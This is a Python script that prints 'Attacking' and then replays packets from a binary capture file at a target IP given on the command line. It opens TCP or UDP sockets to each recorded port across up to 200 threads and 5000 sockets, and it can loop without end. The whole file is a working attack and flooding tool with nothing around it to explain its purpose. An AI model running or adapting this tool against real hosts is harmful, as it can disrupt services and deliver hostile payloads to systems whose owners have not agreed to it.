#! /usr/bin/env python
import socket
import sys
from threading import Thread, active_count
import time

DEBUG = 0

ip_addr = str(sys.argv[1])

conmap = [0 for _ in range(65536)]
threshhold = 1

sock_count = 0
sock_limit = 5000

thread_limit = 200

socket.setdefaulttimeout(5)

def send(sock_fd, ip_addr, port, p_num, t):
    global sock_count
    if conmap[port] > threshhold: 
        sock_fd.close()
        sock_count -= 1
        return

    try:
        sock_fd.connect((ip_addr, port))
        if DEBUG:
            print(p_num," ", 'tcp' if t == 1 else 'udp' if t == 2 else t, " ", port, " connected")
        #print('\n', packet, '\n' )
        sock_fd.send(packet)
        
        sock_fd.close()
        sock_count -= 1
    except ConnectionRefusedError:
        conmap[port] += 1
        if DEBUG:
            print(p_num, " ", 'tcp' if t == 1 else 'udp' if t == 2 else t,  " ", port, " connection refused error")
        sock_fd.close()
        sock_count -= 1
    except TimeoutError:
        conmap[port] += 1
        if DEBUG:
            print(p_num," ", 'tcp' if t == 1 else 'udp' if t == 2 else t,  " ", port, "connection timeouterror")
        sock_fd.close()
        sock_count -= 1

threads = []

packet_counter = 0
repeat_count = int(sys.argv[3])
file_counter = 0

print('Attacking')
while (file_counter < repeat_count) or (repeat_count == -1):
    try:
        with open(sys.argv[2], "rb") as file_stream:
            t = int.from_bytes(file_stream.read(1))
            while t:
                port = int.from_bytes(file_stream.read(2))
                ln = int.from_bytes(file_stream.read(4))
                packet = file_stream.read(ln)
                
                if t != 1 and t != 2:
                    t = int.from_bytes(file_stream.read(1))
                    continue

                if DEBUG:
                    print(t, port, packet)
                if len(packet) < 3 or len(packet) > 200:
                    t = int.from_bytes(file_stream.read(1))
                    continue

                sock_fd = socket.socket(socket.AF_INET, t)
                sock_count += 1
                while sock_count > sock_limit: pass
                while active_count() > thread_limit: pass

                if 1 or repeat_count != -1:
                    thread = Thread(target = send, args = (sock_fd, ip_addr, port, packet_counter, t))
                    thread.start()
                    threads.append(thread)
                else:
                    send(sock_fd, ip_addr, port, packet_counter, t)
                t = int.from_bytes(file_stream.read(1))
                packet_counter += 1
        file_counter += 1
    except KeyboardInterrupt:
        for thread in threads:
            thread.join()
        exit()


for thread in threads:
    thread.join()

